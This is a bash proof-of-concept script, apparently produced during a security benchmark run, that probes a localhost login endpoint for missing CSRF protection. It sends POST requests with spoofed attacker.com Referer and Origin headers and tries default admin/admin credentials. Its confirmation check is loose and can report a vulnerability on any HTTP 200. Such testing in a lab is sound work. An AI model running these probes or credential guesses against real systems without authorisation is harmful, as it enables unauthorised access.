#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login endpoint by submitting a login request with an external referer and no CSRF token validation
# Target: ./repo
# Created: 2025-12-02T16:25:41.482Z
# Session: benchmark-XBEN-069-24-miorxjei

# CSRF Token Protection Missing on Login Endpoint - POC
# This script demonstrates that the /api/login.php endpoint accepts login requests
# from external origins without validating CSRF tokens

TARGET_URL="http://localhost:8080/api/login.php"
EXTERNAL_REFERER="http://attacker.com/malicious.html"

echo "[*] Testing CSRF vulnerability on login endpoint..."
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Submit login request with external referer (simulating CSRF attack)
echo "[*] Test 1: Submitting login request with external referer (CSRF attack simulation)..."
response=$(curl -s -X POST "$TARGET_URL" \
  -H "Referer: $EXTERNAL_REFERER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=testuser&password=testpass' \
  -w "\n%{http_code}")

http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | head -n-1)

echo "[*] HTTP Response Code: $http_code"
echo "[*] Response Body: $body"
echo ""

# Check if login was successful without CSRF token
if echo "$body" | grep -q "success"; then
  echo "[!] VULNERABILITY CONFIRMED: Login accepted without CSRF token!"
  echo "[!] The endpoint accepted a cross-origin request without any token validation."
  exit 0
else
  echo "[-] Login failed (may require valid credentials)"
  echo "[*] Testing with another common username/password..."
  
  # Test 2: Try with admin credentials
  response2=$(curl -s -X POST "$TARGET_URL" \
    -H "Referer: $EXTERNAL_REFERER" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'username=admin&password=admin' \
    -w "\n%{http_code}")
  
  http_code2=$(echo "$response2" | tail -n1)
  body2=$(echo "$response2" | head -n-1)
  
  echo "[*] Test 2 HTTP Response Code: $http_code2"
  echo "[*] Test 2 Response Body: $body2"
  
  # Test 3: Check if endpoint returns error or accepts the request format
  # The key issue is that it accepts cross-origin requests without token validation
  echo ""
  echo "[*] Test 3: Verifying no CSRF token is required in request..."
  
  # Make request without any token parameters
  response3=$(curl -s -X POST "$TARGET_URL" \
    -H "Referer: $EXTERNAL_REFERER" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: http://attacker.com" \
    -d 'username=test&password=test')
  
  echo "[*] Response without token: $response3"
  
  # If response shows login logic is being executed (either success or generic error about invalid creds),
  # then CSRF protection is missing
  if echo "$response3" | grep -qE "(success|Login|password|username)" || [ "$http_code" == "200" ]; then
    echo ""
    echo "[!] VULNERABILITY CONFIRMED: Endpoint processes login without CSRF token validation!"
    echo "[!] Cross-origin requests are being accepted and processed."
    exit 0
  fi
fi

echo ""
echo "[-] Unable to confirm CSRF vulnerability with test requests"
exit 1